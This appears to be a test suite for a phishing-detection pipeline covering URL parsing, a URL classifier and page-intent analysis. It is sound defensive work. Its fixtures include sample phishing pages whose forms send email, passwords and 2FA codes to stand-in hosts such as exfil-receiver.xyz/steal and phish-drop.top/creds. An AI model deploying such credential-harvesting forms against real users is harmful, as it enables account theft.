/**
 * Trust Layer — Golden Regression & Intelligence Pipeline Test Suite
 * Validates:
 * 1. WHATWG URL Parser compliance on all critical edge cases (no protocol-as-hostname bugs).
 * 2. 28-dimensional Feature Extractor integrity & entropy math.
 * 3. Real trained model inference (no hardcoded whitelist bypasses).
 * 4. Model abstention & uncertainty handling.
 * 5. Full end-to-end investigation pipeline on benign and malicious targets.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { URLParser } from '../core/ml/url_parser.js';
import { URLFeatureExtractor } from '../core/ml/url_features.js';
import { URLClassifier } from '../core/ml/url_classifier.js';
import { InvestigationEngine, STAGE, EVIDENCE_TYPE, CASE_STATE } from '../core/investigation_engine.js';
import { DNSReconInvestigator } from '../core/investigators/dns_recon.js';
import { PageStructureExtractor } from '../core/investigators/page_extractor.js';
import { PageIntentEngine, PAGE_INTENT } from '../core/ml/page_intent_engine.js';

describe('Golden Test Suite — URL Parser', () => {

  it('correctly parses https://google.com (CRITICAL BUG REGRESSION TEST)', () => {
    const res = URLParser.parse('https://google.com');
    assert.equal(res.isValid, true);
    assert.equal(res.protocol, 'https:');
    assert.equal(res.hostname, 'google.com');
    assert.equal(res.pathname, '/');
    assert.notEqual(res.hostname, 'https');
    assert.notEqual(res.hostname, 'https:');
  });

  it('correctly parses http://example.com', () => {
    const res = URLParser.parse('http://example.com');
    assert.equal(res.isValid, true);
    assert.equal(res.protocol, 'http:');
    assert.equal(res.hostname, 'example.com');
    assert.equal(res.pathname, '/');
  });

  it('correctly parses https://www.google.com/', () => {
    const res = URLParser.parse('https://www.google.com/');
    assert.equal(res.isValid, true);
    assert.equal(res.hostname, 'www.google.com');
    assert.equal(res.domain, 'google.com');
    assert.deepEqual(res.subdomains, ['www']);
  });

  it('correctly parses https://sub.example.com/path', () => {
    const res = URLParser.parse('https://sub.example.com/path');
    assert.equal(res.isValid, true);
    assert.equal(res.hostname, 'sub.example.com');
    assert.equal(res.pathname, '/path');
    assert.deepEqual(res.subdomains, ['sub']);
  });

  it('correctly parses https://example.com:8443/login', () => {
    const res = URLParser.parse('https://example.com:8443/login');
    assert.equal(res.isValid, true);
    assert.equal(res.hostname, 'example.com');
    assert.equal(res.port, '8443');
    assert.equal(res.pathname, '/login');
  });

  it('correctly parses IP address host: https://1.2.3.4/login', () => {
    const res = URLParser.parse('https://1.2.3.4/login');
    assert.equal(res.isValid, true);
    assert.equal(res.hostname, '1.2.3.4');
    assert.equal(res.isIp, true);
  });

  it('correctly parses Punycode domain: https://xn--example-dk9c.com/', () => {
    const res = URLParser.parse('https://xn--example-dk9c.com/');
    assert.equal(res.isValid, true);
    assert.equal(res.isPunycode, true);
  });

  it('correctly parses query string & fragment: https://example.com/path?a=b#section', () => {
    const res = URLParser.parse('https://example.com/path?a=b#section');
    assert.equal(res.isValid, true);
    assert.equal(res.pathname, '/path');
    assert.equal(res.query, '?a=b');
    assert.equal(res.fragment, '#section');
  });

});

describe('Golden Test Suite — Feature Extraction & Entropy Math', () => {

  it('extracts all 28 schema features without null or undefined', () => {
    const ext = URLFeatureExtractor.extract('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn');
    assert.equal(ext.extractionStatus, 'SUCCESS');
    assert.equal(ext.featureVector.length, 28);
    assert.equal(ext.schemaVersion, 'url_features_v1.0');
    assert.ok(ext.features.hostname_entropy > 0);
    assert.equal(ext.features.has_https, 1);
  });

  it('calculates accurate Shannon entropy', () => {
    const e1 = URLFeatureExtractor.calculateShannonEntropy('aaaa');
    assert.equal(e1, 0.0); // Zero entropy for uniform string

    const e2 = URLFeatureExtractor.calculateShannonEntropy('abcd');
    assert.equal(e2, 2.0); // log2(4) = 2.0
  });

});

describe('Golden Test Suite — Calibrated URL Model Inference', () => {

  it('predicts google.com as LEGITIMATE via trained model (NO hardcoded whitelist)', () => {
    const pred = URLClassifier.predict('https://www.google.com');
    assert.equal(pred.status, 'SUCCESS');
    assert.equal(pred.prediction, 'LEGITIMATE');
    assert.ok(pred.probabilityPhishing < 0.25, `Expected P(phishing) < 0.25, got ${pred.probabilityPhishing}`);
    assert.ok(pred.probabilityLegitimate > 0.75);
    assert.equal(pred.modelName, 'URL-TABULAR-V1');
  });

  it('predicts wikipedia.org as LEGITIMATE via trained model', () => {
    const pred = URLClassifier.predict('https://en.wikipedia.org/wiki/Computer_security');
    assert.equal(pred.status, 'SUCCESS');
    assert.equal(pred.prediction, 'LEGITIMATE');
    assert.ok(pred.probabilityPhishing < 0.25);
  });

  it('predicts phishing spoof URL as PHISHING with high confidence', () => {
    const pred = URLClassifier.predict('http://hdfc-netbanking-verify.xyz/login.php?verify=1');
    assert.equal(pred.status, 'SUCCESS');
    assert.equal(pred.prediction, 'PHISHING');
    assert.ok(pred.probabilityPhishing >= 0.75, `Expected P(phishing) >= 0.75, got ${pred.probabilityPhishing}`);
    assert.ok(pred.topContributingFeatures.length > 0);
  });

});

describe('Golden Test Suite — End-to-End Investigation Engine', () => {

  it('investigates https://google.com through full pipeline without fake values', async () => {
    const icase = InvestigationEngine.createCase('https://google.com');
    await InvestigationEngine.investigate(icase);

    assert.equal(icase.status, CASE_STATE.COMPLETED);
    assert.equal(icase.schema.urlAnalysis.hostname, 'google.com');
    assert.notEqual(icase.schema.urlAnalysis.hostname, 'https');
    assert.equal(icase.riskLevel, 'LOW');
    assert.equal(icase.schema.assessment.verificationState, 'UNVERIFIED');
    assert.equal(icase.schema.httpAnalysis.status, 'NOT_RUN');
    assert.equal(icase.schema.pageAnalysis.status, 'NOT_RUN');
    assert.ok(icase.evidence.length >= 3);
  });

  it('investigates https://www.amazon.in/ without false identity mismatch (CRITICAL BUG REGRESSION TEST)', async () => {
    const icase = InvestigationEngine.createCase('https://www.amazon.in/');
    await InvestigationEngine.investigate(icase);

    assert.equal(icase.schema.urlAnalysis.hostname, 'www.amazon.in');
    assert.equal(icase.schema.identityAnalysis.claimedEntity, 'Amazon');
    assert.equal(icase.schema.identityAnalysis.identityContinuity, 'MATCH');
    assert.equal(icase.schema.trustBreakpoints.length, 0, 'amazon.in should have zero trust breakpoints');
    assert.notEqual(icase.riskLevel, 'CRITICAL', 'amazon.in must never be classified as CRITICAL threat');
  });

});

describe('Golden Test Suite — Page Structure & Intent Engine v2.2', () => {

  it('extracts DOM structure, headings, buttons, and form inputs accurately', () => {
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <title>Corporate Invoice Portal — View Invoice #8492</title>
          <meta name="description" content="Download and view your corporate billing statement.">
        </head>
        <body>
          <h1>Invoice #8492 Ready</h1>
          <h2>Please authenticate to decrypt document</h2>
          <form action="https://exfil-receiver.xyz/steal" method="POST">
            <input name="email" type="email" placeholder="Corporate Email">
            <input name="password" type="password" placeholder="Domain Password">
            <input name="otp" type="text" placeholder="2FA PIN">
            <button type="submit">Download Secure Invoice</button>
          </form>
          <script src="https://cdn.exfil-receiver.xyz/collector.js"></script>
        </body>
      </html>
    `;

    const pageExt = PageStructureExtractor.extract(html, 'legit-portal.com');
    assert.equal(pageExt.status, 'SUCCESS');
    assert.equal(pageExt.title, 'Corporate Invoice Portal — View Invoice #8492');
    assert.ok(pageExt.headings.includes('Invoice #8492 Ready'));
    assert.equal(pageExt.metaDescription, 'Download and view your corporate billing statement.');
    assert.equal(pageExt.forms.length, 1);
    assert.equal(pageExt.forms[0].hasPassword, true);
    assert.equal(pageExt.forms[0].isExternal, true);
    assert.equal(pageExt.forms[0].destinationHost, 'exfil-receiver.xyz');
    assert.ok(pageExt.domFingerprint.startsWith('DOM-0x'));
  });

  it('detects deceptive PURPOSE_MISMATCH when document lure hides credential harvesting', () => {
    const html = `
      <html>
        <head><title>DHL Express — Track Delivery & Download Receipt</title></head>
        <body>
          <h1>Package Tracking #994827</h1>
          <form action="https://phish-drop.top/creds" method="POST">
            <input name="user" type="text" placeholder="Email">
            <input name="pass" type="password" placeholder="Email Password">
            <button>Verify Identity to Release Package</button>
          </form>
        </body>
      </html>
    `;

    const pageExt = PageStructureExtractor.extract(html, 'dhl-delivery-track.top');
    const intent = PageIntentEngine.analyze(pageExt, { hostname: 'dhl-delivery-track.top' });

    assert.equal(intent.primary, PAGE_INTENT.LOGIN);
    assert.equal(intent.claimedPurpose, 'SHIPPING_TRACKING');
    assert.equal(intent.purposeMismatch, true);
    assert.ok(intent.mismatchReason.includes('Deceptive'));
    assert.ok(intent.requestedActions.includes('SUBMIT_CREDENTIALS'));
    assert.ok(intent.requestedData.includes('PASSWORD'));
    assert.equal(intent.dataFlow.length, 2);
    assert.equal(intent.dataFlow.find(d => d.fieldName === 'pass').riskLevel, 'CRITICAL');
  });

  it('classifies legitimate SEARCH intent for search engines without false threat alarms', () => {
    const html = `
      <html>
        <head><title>Google</title></head>
        <body>
          <form action="/search" method="GET">
            <input name="q" type="search" placeholder="Search Google or type a URL">
            <input type="submit" value="Google Search">
          </form>
        </body>
      </html>
    `;

    const pageExt = PageStructureExtractor.extract(html, 'google.com');
    const intent = PageIntentEngine.analyze(pageExt, { hostname: 'google.com' });

    assert.equal(intent.primary, PAGE_INTENT.SEARCH);
    assert.equal(intent.purposeMismatch, false);
    assert.ok(intent.requestedActions.includes('SUBMIT_SEARCH'));
    assert.ok(intent.requestedData.includes('SEARCH_QUERY'));
  });

  it('classifies PAYMENT intent when card fields are requested', () => {
    const html = `
      <html>
        <head><title>Secure Checkout — Payment Gateway</title></head>
        <body>
          <h2>Complete Payment</h2>
          <form action="/api/charge" method="POST">
            <input name="card_number" type="text" placeholder="Card Number">
            <input name="exp_date" type="text" placeholder="MM/YY">
            <input name="card_cvv" type="password" placeholder="CVV">
            <button>Pay ₹1,499</button>
          </form>
        </body>
      </html>
    `;

    const pageExt = PageStructureExtractor.extract(html, 'merchant.com');
    const intent = PageIntentEngine.analyze(pageExt, { hostname: 'merchant.com' });

    assert.equal(intent.primary, PAGE_INTENT.PAYMENT);
    assert.ok(intent.requestedActions.includes('MAKE_PAYMENT'));
    assert.ok(intent.requestedData.includes('CREDIT_CARD_NUMBER'));
    assert.ok(intent.requestedData.includes('CARD_CVV'));
  });

  it('populates simulated HDFC page intent without treating URL-only fixture content as confirmed threat evidence', async () => {
    const originalResolve = DNSReconInvestigator.resolve;
    DNSReconInvestigator.resolve = async hostname => ({ status: 'SUCCESS', hostname,
      ipAddresses: ['203.0.113.8'], dnsRecords: [], nameservers: [], asn: null,
      tlsMetadata: null, source: 'deterministic test fixture', timestamp: Date.now(), error: null });
    try {
      const icase = InvestigationEngine.createCase('http://hdfc-netbanking-verify.xyz/login');
      await InvestigationEngine.investigate(icase);

      assert.equal(icase.status, CASE_STATE.COMPLETED);
      assert.equal(icase.schema.pageAnalysis.status, 'COMPLETED');
      assert.equal(icase.schema.pageAnalysis.intent.primary, PAGE_INTENT.OTP_VERIFICATION);
      assert.ok(icase.schema.pageAnalysis.dataFlow.length >= 3);
      assert.ok(icase.schema.trustBreakpoints.some(b => b.type === 'CROSS_DOMAIN_FORM_DESTINATION'));
      assert.equal(icase.schema.pageContentAssessment.fullRenderedInspection, false);
      assert.equal(icase.schema.overallAssessment.finalVerdict, 'UNDER_REVIEW');
      assert.equal(icase.schema.assessment.verificationState, 'UNVERIFIED');
      assert.equal(icase.riskLevel, 'HIGH');
    } finally {
      DNSReconInvestigator.resolve = originalResolve;
    }
  });

  it('runs PageIntentClassifier multi-class softmax model and abstains on empty/ambiguous DOM', async () => {
    const { PageIntentClassifier } = await import('../core/ml/page_intent_classifier.js');

    const emptyExt = PageStructureExtractor.extract('', '');
    const predEmpty = PageIntentClassifier.predict(emptyExt);
    assert.equal(predEmpty.abstain, true);
    assert.equal(predEmpty.primaryIntent, 'UNKNOWN');

    const loginHtml = `
      <html>
        <head><title>Sign in to your corporate portal</title></head>
        <body>
          <form action="/login" method="POST">
            <input name="email" type="email">
            <input name="password" type="password">
            <button>Log In</button>
          </form>
        </body>
      </html>
    `;
    const loginExt = PageStructureExtractor.extract(loginHtml, 'portal.corp.com');
    const predLogin = PageIntentClassifier.predict(loginExt, { hostname: 'portal.corp.com' });
    assert.equal(predLogin.abstain, false);
    assert.equal(predLogin.primaryIntent, 'LOGIN');
    assert.ok(predLogin.primaryProbability > 0.50);
  });

  it('generates a complete structured Page Intelligence Summary answering the 10 key questions', () => {
    const summary = PageIntentEngine.generatePageIntelligenceSummary({
      targetUrl: 'https://example.xyz/verify',
      primaryIntent: 'ACCOUNT_VERIFICATION',
      secondaryIntent: 'LOGIN',
      modelName: 'PAGE-INTENT-v1',
      modelProbability: 0.942,
      requestedActions: ['SUBMIT_CREDENTIALS', 'ENTER_OTP'],
      requestedData: ['EMAIL', 'PASSWORD', 'OTP'],
      dataFlow: [{ fieldName: 'password', dataCategory: 'PASSWORD', formAction: 'https://collector.xyz/steal', destinationHost: 'collector.xyz', isExternal: true }],
      claimedEntity: 'Amazon',
      observedDomain: 'example.xyz',
      claimedPurpose: 'Verify your account',
      observedPurpose: 'Credential + OTP submission',
      purposeConsistency: 'MISMATCH',
      purposeMismatch: true,
      mismatchReason: 'Form routes credentials to external endpoint',
      identityContinuity: 'MISMATCH'
    });

    assert.ok(summary.text.includes('PAGE INTELLIGENCE SUMMARY'));
    assert.ok(summary.text.includes('WHAT THIS PAGE APPEARS TO DO'));
    assert.ok(summary.text.includes('WHAT THE USER IS ASKED TO DO'));
    assert.ok(summary.text.includes('WHAT INFORMATION IS REQUESTED'));
    assert.ok(summary.text.includes('WHERE THE INFORMATION IS SENT'));
    assert.ok(summary.text.includes('IDENTITY & ENTITY RECONCILIATION'));
    assert.ok(summary.text.includes('PURPOSE CONSISTENCY ANALYSIS'));
    assert.equal(summary.primaryIntent, 'ACCOUNT_VERIFICATION');
    assert.equal(summary.purposeConsistency, 'MISMATCH');
  });

});


